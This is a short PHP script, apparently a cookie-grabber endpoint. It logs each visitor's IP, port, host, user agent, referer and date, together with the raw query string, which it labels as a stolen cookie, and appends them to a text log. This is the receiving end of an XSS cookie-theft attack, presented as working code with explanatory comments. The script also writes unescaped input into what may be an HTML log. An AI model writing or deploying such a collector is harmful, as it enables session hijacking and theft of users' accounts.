<?php

// Function to get the client's IP address
function fetchClientIP()
{
        // Check if the HTTP_CLIENT_IP environment variable is set and not 'unknown'
        if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
                $clientIP = getenv("HTTP_CLIENT_IP");
        // Check if the HTTP_X_FORWARDED_FOR environment variable is set and not 'unknown'
        else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
                $clientIP = getenv("HTTP_X_FORWARDED_FOR");
        // Check if the REMOTE_ADDR environment variable is set and not 'unknown'
        else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
                $clientIP = getenv("REMOTE_ADDR");
        // Check if the $_SERVER['REMOTE_ADDR'] is set and not 'unknown'
        else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
                $clientIP = $_SERVER['REMOTE_ADDR'];
        // If none of the above, set IP to 'unknown'
        else
                $clientIP = "unknown";
        
        // Return the determined IP address
        return $clientIP;
}

// Function to log client data
function recordClientData()
{
        // Log file name
        $logFile = "log.txt";
        // Get the query string from the server
        $queryString = $_SERVER['QUERY_STRING'];
        // Check if register_globals is enabled
        $registerGlobalsEnabled = (bool) ini_get('register_globals');
        // Get the IP address based on register_globals setting
        if ($registerGlobalsEnabled) 
                $clientIP = getenv('REMOTE_ADDR');
        else 
                $clientIP = fetchClientIP();

        // Get the client's remote port
        $remotePort = $_SERVER['REMOTE_PORT'];
        // Get the client's user agent string
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        // Get the request method
        $requestMethod = $_SERVER['REQUEST_METHOD'];
        // Get the client's remote host
        $remoteHost = $_SERVER['REMOTE_HOST'];
        // Get the HTTP referer
        $referer = $_SERVER['HTTP_REFERER'];
        // Get the current date and time
        $currentDate = date("l dS of F Y h:i:s A");
        // Open the log file for appending
        $logHandle = fopen("$logFile", "a+");

        // Check if the log file has .htm or .html extension and log accordingly
        if (preg_match("/\bhtm\b/i", $logFile) || preg_match("/\bhtml\b/i", $logFile))
                fputs($logHandle, "IP: $clientIP | PORT: $remotePort | HOST: $remoteHost | Agent: $userAgent | METHOD: $requestMethod | REF: $referer | DATE: $currentDate | COOKIE:  $queryString <br>");
        else
                fputs($logHandle, "IP: $clientIP | PORT: $remotePort | HOST: $remoteHost |  Agent: $userAgent | METHOD: $requestMethod | REF: $referer |  DATE: $currentDate | COOKIE:  $queryString \n\n");

        // Close the log file
        fclose($logHandle);
}

// Call the function to log the data
recordClientData();

?>
